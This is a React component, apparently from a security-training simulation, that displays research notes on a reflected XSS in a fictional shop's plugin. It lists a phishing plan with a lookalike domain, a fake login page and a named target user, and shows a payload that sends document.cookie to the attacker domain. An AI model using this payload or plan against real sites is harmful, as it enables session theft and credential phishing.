import { FileText, Target, User, AlertTriangle, CheckCircle } from 'lucide-react'

export default function ResearchNotes() {
  return (
    <div className="h-full overflow-auto bg-slate-900 flex flex-col">
      {/* Header */}
      <div className="px-5 py-3 border-b border-slate-700 flex items-center gap-2 shrink-0">
        <FileText size={14} className="text-[var(--color-brand-400)]" />
        <span className="text-sm font-semibold text-white">Kai's Research Notes</span>
        <span className="text-xs text-slate-500 ml-auto font-mono">research-notes.md</span>
      </div>

      <div className="flex-1 overflow-auto p-5 space-y-4">
        {/* Vulnerability Summary */}
        <div className="bg-slate-800 rounded-xl border border-slate-700 p-4">
          <div className="flex items-center gap-2 mb-3">
            <AlertTriangle size={14} className="text-amber-400" />
            <span className="text-xs font-bold text-amber-400 uppercase tracking-wide">Vulnerability Confirmed</span>
          </div>
          <div className="space-y-2 text-sm text-slate-300">
            <div className="flex items-start gap-2">
              <CheckCircle size={12} className="text-emerald-400 mt-0.5 shrink-0" />
              <span><strong className="text-white">Plugin:</strong> GlideView 2.0.4</span>
            </div>
            <div className="flex items-start gap-2">
              <CheckCircle size={12} className="text-emerald-400 mt-0.5 shrink-0" />
              <span><strong className="text-white">CVE:</strong> CVE-2024-31047 (CVSS 4.3 MEDIUM)</span>
            </div>
            <div className="flex items-start gap-2">
              <CheckCircle size={12} className="text-emerald-400 mt-0.5 shrink-0" />
              <span><strong className="text-white">Type:</strong> Reflected Cross-Site Scripting (XSS)</span>
            </div>
            <div className="flex items-start gap-2">
              <CheckCircle size={12} className="text-emerald-400 mt-0.5 shrink-0" />
              <span><strong className="text-white">Vector:</strong> URL hash fragment injection</span>
            </div>
          </div>
        </div>

        {/* Attack Plan */}
        <div className="bg-slate-800 rounded-xl border border-red-900/50 p-4">
          <div className="flex items-center gap-2 mb-3">
            <Target size={14} className="text-red-400" />
            <span className="text-xs font-bold text-red-400 uppercase tracking-wide">Proof-of-Concept Attack Plan</span>
          </div>
          <div className="space-y-3 text-sm text-slate-300">
            <div className="flex items-start gap-3">
              <span className="w-5 h-5 rounded bg-red-900/50 text-red-300 text-xs font-bold flex items-center justify-center shrink-0">1</span>
              <div>
                <p className="font-medium text-white">Create fake login page</p>
                <p className="text-xs text-slate-400">Mirror VoltMart's login interface to harvest credentials</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="w-5 h-5 rounded bg-red-900/50 text-red-300 text-xs font-bold flex items-center justify-center shrink-0">2</span>
              <div>
                <p className="font-medium text-white">Register lookalike domain</p>
                <p className="text-xs text-slate-400">www.volt-mart.io (note the hyphen) → hosts malicious page</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="w-5 h-5 rounded bg-red-900/50 text-red-300 text-xs font-bold flex items-center justify-center shrink-0">3</span>
              <div>
                <p className="font-medium text-white">Craft malicious URL</p>
                <p className="text-xs text-slate-400">Replace alert() with window.open() to steal session cookies</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="w-5 h-5 rounded bg-red-900/50 text-red-300 text-xs font-bold flex items-center justify-center shrink-0">4</span>
              <div>
                <p className="font-medium text-white">Deliver via phishing email</p>
                <p className="text-xs text-slate-400">Send crafted link to target user (Priya)</p>
              </div>
            </div>
          </div>
        </div>

        {/* Target */}
        <div className="bg-slate-800 rounded-xl border border-slate-700 p-4">
          <div className="flex items-center gap-2 mb-3">
            <User size={14} className="text-blue-400" />
            <span className="text-xs font-bold text-blue-400 uppercase tracking-wide">Target User</span>
          </div>
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-purple-900/50 border border-purple-700 flex items-center justify-center text-sm font-bold text-purple-300">
              PA
            </div>
            <div>
              <p className="text-sm font-medium text-white">Priya Anand</p>
              <p className="text-xs text-slate-400">Registered VoltMart customer with active session</p>
            </div>
          </div>
        </div>

        {/* Payload */}
        <div className="bg-slate-800 rounded-xl border border-slate-700 p-4">
          <span className="text-xs font-bold text-slate-400 uppercase tracking-wide mb-2 block">Final Payload</span>
          <code className="text-xs text-amber-300 font-mono break-all leading-relaxed block bg-slate-900 rounded p-3 border border-slate-700">
            window.open('http://volt-mart.io?sid=' + document.cookie)
          </code>
        </div>
      </div>
    </div>
  )
}
